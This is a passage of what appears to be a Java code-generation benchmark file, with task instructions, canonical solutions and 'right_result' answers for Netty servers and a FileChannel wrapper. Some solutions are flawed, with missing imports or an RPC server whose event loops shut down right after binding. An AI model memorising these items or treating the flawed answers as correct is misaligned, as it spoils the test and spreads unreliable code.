    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.NettyRuntime;\nimport lombok.RequiredArgsConstructor;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.shardingsphere.elasticjob.restful.pipeline.RestfulServiceChannelInitializer;\n\n@RequiredArgsConstructor\n@Slf4j\npublic final class NettyRestfulService implements RestfulService {\n\n    private static final int DEFAULT_WORKER_GROUP_THREADS = 1 + 2 * NettyRuntime.availableProcessors();\n\n    private final NettyRestfulServiceConfiguration config;\n\n    private ServerBootstrap serverBootstrap;\n\n    private EventLoopGroup bossEventLoopGroup;\n\n    private EventLoopGroup workerEventLoopGroup;\n\n    private void initServerBootstrap() {\n        bossEventLoopGroup = new NioEventLoopGroup();\n        workerEventLoopGroup = new NioEventLoopGroup(DEFAULT_WORKER_GROUP_THREADS);\n        serverBootstrap = new ServerBootstrap()\n                .group(bossEventLoopGroup, workerEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new RestfulServiceChannelInitializer(config));\n    }\n\n    @SneakyThrows(InterruptedException.class)\n    @Override\n    public void startup() {\n        initServerBootstrap();\n        ChannelFuture channelFuture = serverBootstrap.bind(config.getHost(), config.getPort());\n        channelFuture.addListener(future -> {\n            if (future.isSuccess()) {\n                log.info(\"Restful Service started on port {}.\", config.getPort());\n            } else {\n                log.error(\"Failed to start Restful Service.\", future.cause());\n            }\n        }).sync();\n    }\n\n    @Override\n    public void shutdown() {\n        bossEventLoopGroup.shutdownGracefully();\n        workerEventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic final class NettyRestfulService implements RestfulService {\n    private static final int DEFAULT_WORKER_GROUP_THREADS = Runtime.getRuntime().availableProcessors();\n    private NettyRestfulServiceConfiguration config;\n    private ServerBootstrap serverBootstrap;\n    private EventLoopGroup bossEventLoopGroup;\n    private EventLoopGroup workerEventLoopGroup;\n\n    public void initServerBootstrap() {\n        bossEventLoopGroup = new NioEventLoopGroup(1);\n        workerEventLoopGroup = new NioEventLoopGroup(DEFAULT_WORKER_GROUP_THREADS);\n        serverBootstrap = new ServerBootstrap()\n                .group(bossEventLoopGroup, workerEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline p = ch.pipeline();\n                        // Add your request handler here\n                    }\n                });\n    }\n\n    public void startup() {\n        try {\n            ChannelFuture future = serverBootstrap.bind(config.getHost(), config.getPort()).sync();\n            if (future.isSuccess()) {\n                System.out.println(\"Server started successfully at \" + config.getHost() + \":\" + config.getPort());\n            } else {\n                System.err.println(\"Failed to start server\");\n            }\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        if (bossEventLoopGroup != null) {\n            bossEventLoopGroup.shutdownGracefully();\n        }\n        if (workerEventLoopGroup != null) {\n            workerEventLoopGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 17,
    "Instruction": "Task Description: Create a Java class that provides file channel operations using Java NIO's FileChannel for efficient file I/O operations, including reading, writing, positioning, truncating, and memory mapping.\n\nClass Description: TranslogFileChannel is a wrapper class for FileChannel that simplifies file operations while maintaining the performance benefits of Java NIO. It implements Closeable to ensure proper resource cleanup.\n\nAttributes:\n- location: Path - The file path associated with the FileChannel\n- channel: FileChannel - The underlying FileChannel instance for performing I/O operations\n\nMethods:\n- TranslogFileChannel(Path location) -> void - Constructor that opens a FileChannel for both reading and writing at the specified path\n- write(ByteBuffer src) -> void - Writes data from the given ByteBuffer to the file\n- read(ByteBuffer dst) -> int - Reads data from the file into the given ByteBuffer, returning the number of bytes read\n- position() -> long - Returns the current position in the file\n- position(long newPosition) -> void - Sets the position in the file\n- size() -> long - Returns the current size of the file\n- truncate(long size) -> void - Truncates the file to the specified size\n- force(boolean metaData) -> void - Forces any updates to be written to the storage device\n- transferTo(long position, long count, WritableByteChannel target) -> long - Transfers bytes from this channel to the given writable channel\n- transferFrom(ReadableByteChannel src, long position, long count) -> long - Transfers bytes into this channel from the given readable channel\n- map(FileChannel.MapMode mode, long position, long size) -> MappedByteBuffer - Maps a region of this channel's file directly into memory\n- close() -> void - Closes the FileChannel and releases associated resources",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class TranslogFileChannel implements Closeable {\n\n    private final Path location;\n    private FileChannel channel;\n\n    public TranslogFileChannel(Path location) throws IOException {\n        this.location = location;\n        this.channel = FileChannel.open(location, StandardOpenOption.READ, StandardOpenOption.WRITE);\n    }\n\n    public void write(ByteBuffer src) throws IOException {\n        channel.write(src);\n    }\n\n    public int read(ByteBuffer dst) throws IOException {\n        return channel.read(dst);\n    }\n\n    public long position() throws IOException {\n        return channel.position();\n    }\n\n    public void position(long newPosition) throws IOException {\n        channel.position(newPosition);\n    }\n\n    public long size() throws IOException {\n        return channel.size();\n    }\n\n    public void truncate(long size) throws IOException {\n        channel.truncate(size);\n    }\n\n    public void force(boolean metaData) throws IOException {\n        channel.force(metaData);\n    }\n\n    public long transferTo(long position, long count, WritableByteChannel target) throws IOException {\n        return channel.transferTo(position, count, target);\n    }\n\n    public long transferFrom(ReadableByteChannel src, long position, long count) throws IOException {\n        return channel.transferFrom(src, position, count);\n    }\n\n    public MappedByteBuffer map(MapMode mode, long position, long size) throws IOException {\n        return channel.map(mode, position, size);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.ReadableByteChannel;\nimport java.nio.channels.WritableByteChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class TranslogFileChannel implements AutoCloseable {\n    private final Path location;\n    private final FileChannel channel;\n\n    public TranslogFileChannel(Path location) throws IOException {\n        this.location = location;\n        this.channel = FileChannel.open(location, StandardOpenOption.READ, StandardOpenOption.WRITE);\n    }\n\n    public void write(ByteBuffer src) throws IOException {\n        channel.write(src);\n    }\n\n    public int read(ByteBuffer dst) throws IOException {\n        return channel.read(dst);\n    }\n\n    public long position() throws IOException {\n        return channel.position();\n    }\n\n    public void position(long newPosition) throws IOException {\n        channel.position(newPosition);\n    }\n\n    public long size() throws IOException {\n        return channel.size();\n    }\n\n    public void truncate(long size) throws IOException {\n        channel.truncate(size);\n    }\n\n    public void force(boolean metaData) throws IOException {\n        channel.force(metaData);\n    }\n\n    public long transferTo(long position, long count, WritableByteChannel target) throws IOException {\n        return channel.transferTo(position, count, target);\n    }\n\n    public long transferFrom(ReadableByteChannel src, long position, long count) throws IOException {\n        return channel.transferFrom(src, position, count);\n    }\n\n    public MappedByteBuffer map(FileChannel.MapMode mode, long position, long size) throws IOException {\n        return channel.map(mode, position, size);\n    }\n\n    @Override\n    public void close() throws IOException {\n        channel.close();\n    }\n}\n```"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling HTTP requests with optional SSL encryption.\n\nClass Description: The HttpSnoopServer class is a Netty-based HTTP server that can operate in both secure (HTTPS) and non-secure (HTTP) modes. It uses a boss-worker thread model for handling connections and includes SSL support through self-signed certificates when enabled.\n\nAttributes:\n- SSL: static final boolean - Determines whether SSL encryption should be enabled (configured via system property \"ssl\")\n- PORT: static final int - The port number the server will listen on (configured via system property \"port\", defaults to 8443 for SSL or 8080 for non-SSL)\n\nMethods:\n- start(): void - Starts the HTTP server with the configured settings. Throws Exception if server startup fails.\n  - Initializes SSL context if enabled\n  - Sets up boss and worker event loop groups\n  - Configures server bootstrap with channel type and handlers\n  - Binds to specified port and starts accepting connections\n  - Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpSnoopServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpSnoopServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class HttpSnoopServer {\n    public static final boolean SSL = Boolean.parseBoolean(System.getProperty(\"ssl\", \"false\"));\n    public static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL ? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            SslContext sslCtx = null;\n            if (SSL) {\n                SelfSignedCertificate ssc = new SelfSignedCertificate();\n                sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n            }\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new HttpRequestDecoder())\n                      .addLast(new HttpResponseEncoder())\n                      .addLast(new HttpObjectAggregator(65536))\n                      .addLast(new HttpSnoopHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 171,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using the Netty framework to handle incoming client connections and process requests.\n\nClass Description: The `JacksonServer` class is a Netty-based TCP server that listens on a specified port for incoming client connections. It uses a boss-worker thread model to handle connections efficiently and includes logging for monitoring server activity. The server is designed to be gracefully shutdown when no longer needed.\n\nAttributes:\n- PORT: [int] - The port number on which the server will listen for incoming connections (default: 8082).\n\nMethods:\n- start(): [void] - Initializes and starts the Netty TCP server. It sets up the server configuration, binds to the specified port, and keeps the server running until it is shutdown. This method throws Exception if any error occurs during server startup or operation.\n  - Input: None\n  - Output: None (but may throw Exception)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class JacksonServer {\n\n    static final int PORT = 8082;\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new JacksonServerInitializer());\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.concurrent.Future;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class JacksonServer {\n    private static final int PORT = 8082;\n    private static final Logger logger = LoggerFactory.getLogger(JacksonServer.class);\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new JacksonServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            logger.info(\"Server started on port {}\", PORT);\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n            logger.info(\"Server shut down\");\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            new JacksonServer().start();\n        } catch (Exception e) {\n            logger.error(\"Failed to start server\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 172,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that handles RPC (Remote Procedure Call) requests and responses, including server startup, shutdown, and connection management.\n\nClass Description: NettyServer is a TCP server implementation using Netty framework that provides RPC functionality. It manages server lifecycle, connection handling, and request processing through a thread pool.\n\nAttributes:\n- thread: Thread - The thread running the Netty server instance\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty server with the specified RPC provider configuration. Initializes thread pools, event loops, and server bootstrap.\n  Input: \n    - xxlRpcProviderFactory: XxlRpcProviderFactory - Configuration factory providing server parameters and serializer\n  Output: None (server runs asynchronously in background thread)\n\n- stop() -> void - Stops the Netty server gracefully by interrupting the server thread and shutting down resources.\n  Input: None\n  Output: None (performs cleanup operations)\n\nThe class should handle:\n1. Server bootstrap configuration with NIO transport\n2. Connection pipeline setup with idle state detection\n3. Request/response serialization\n4. Thread pool management for request processing\n5. Graceful shutdown procedures",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcResponse;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport com.wugui.datax.rpc.remoting.net.Server;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) throws Exception {\n        thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                        NettyServer.class.getSimpleName(),\n                        xxlRpcProviderFactory.getCorePoolSize(),\n                        xxlRpcProviderFactory.getMaxPoolSize());\n                EventLoopGroup bossGroup = new NioEventLoopGroup();\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n                try {\n                    ServerBootstrap bootstrap = new ServerBootstrap();\n                    bootstrap.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new ChannelInitializer<SocketChannel>() {\n                                @Override\n                                public void initChannel(SocketChannel channel) throws Exception {\n                                    channel.pipeline()\n                                            .addLast(new IdleStateHandler(0,0, Beat.BEAT_INTERVAL*3, TimeUnit.SECONDS))\n                                            .addLast(new NettyDecoder(XxlRpcRequest.class, xxlRpcProviderFactory.getSerializerInstance()))\n                                            .addLast(new NettyEncoder(XxlRpcResponse.class, xxlRpcProviderFactory.getSerializerInstance()))\n                                            .addLast(new NettyServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                                }\n                            })\n                            .childOption(ChannelOption.TCP_NODELAY, true)\n                            .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                    ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                    onStarted();\n                    future.channel().closeFuture().sync();\n                } catch (Exception e) {\n                    if (e instanceof InterruptedException) {\n                        logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                    } else {\n                        logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                    }\n                } finally {\n                    try {\n                        serverHandlerPool.shutdown();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                    try {\n                        workerGroup.shutdownGracefully();\n                        bossGroup.shutdownGracefully();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() throws Exception {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class NettyServer {\n    private Thread thread;\n\n    public void start(XxlRpcProviderFactory xxlRpcProviderFactory) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        ExecutorService executorService = Executors.newFixedThreadPool(xxlRpcProviderFactory.getThreadPoolSize());\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new LengthFieldBasedFrameDecoder(65535, 0, 4, 0, 4));\n                     p.addLast(new LengthFieldPrepender(4));\n                     p.addLast(new IdleStateHandler(0, 0, xxlRpcProviderFactory.getIdleTimeout()));\n                     p.addLast(new RpcRequestHandler(xxlRpcProviderFactory));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(xxlRpcProviderFactory.getPort()).sync();\n            thread = new Thread(() -> {\n                try {\n                    f.channel().closeFuture().sync();\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            });\n            thread.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        if (thread != null && !thread.isInterrupted()) {\n            thread.interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 173,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that echoes back any received messages to the client. The server should be configurable to run on any specified port and should properly handle resource cleanup during shutdown.\n\nClass Description: EchoServer is a Netty-based TCP server implementation that listens for incoming connections, processes received messages by echoing them back, and manages server lifecycle including startup and graceful shutdown.\n\nAttributes:\n- DEFAULT_PORT: int - The default port number (7) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server bootstrap instance used to configure and start the server\n\nMethods:\n- EchoServer() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n  Input: port (int) - The port number to bind the server to\n- stop() -> void - Shuts down the event loop groups gracefully to release all resources\n- main(String[] args) -> void - Entry point that creates and starts the server instance\n  Input: args (String[]) - Command line arguments (optional port number)\n  Output: None (runs indefinitely until terminated)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : DEFAULT_PORT;\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class EchoServer {\n    private static final int DEFAULT_PORT = 7;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap()\n                .group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new StringDecoder());\n                        pipeline.addLast(new StringEncoder());\n                        pipeline.addLast(new SimpleChannelInboundHandler<String>() {\n                            @Override\n                            protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n                                ctx.writeAndFlush(msg);\n                            }\n                        });\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public void start(int port) {\n        try {\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}\n```"
  },
  {
    "Task_id": 174,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage communication protocols.\n\nClass Description: RemoteServer is a TCP server implementation using Netty framework that listens on a specified port, manages client connections, and maintains a list of communication protocols. It extends BaseServer for basic server functionality.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - A list to maintain active communication protocols between clients and browsers\n\nMethods:\n- RemoteServer(int port) -> [Constructor] - Initializes the server with the specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server, configures the server bootstrap with worker groups, channel type, and handlers, then binds to the specified port\n- findProtocolByBrowser(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a browser's channel context\n- findProtocolByKey(String key) -> Protocol - Finds and returns a protocol associated with a specific key\n- findProtocolByClient(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a client's channel context",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class RemoteServer extends BaseServer {\n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new ChildChannel(new RemoteServerWebsocketEventImp()));\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByKey(String key) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && StringUtils.equals(key, protocol.getKey())) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
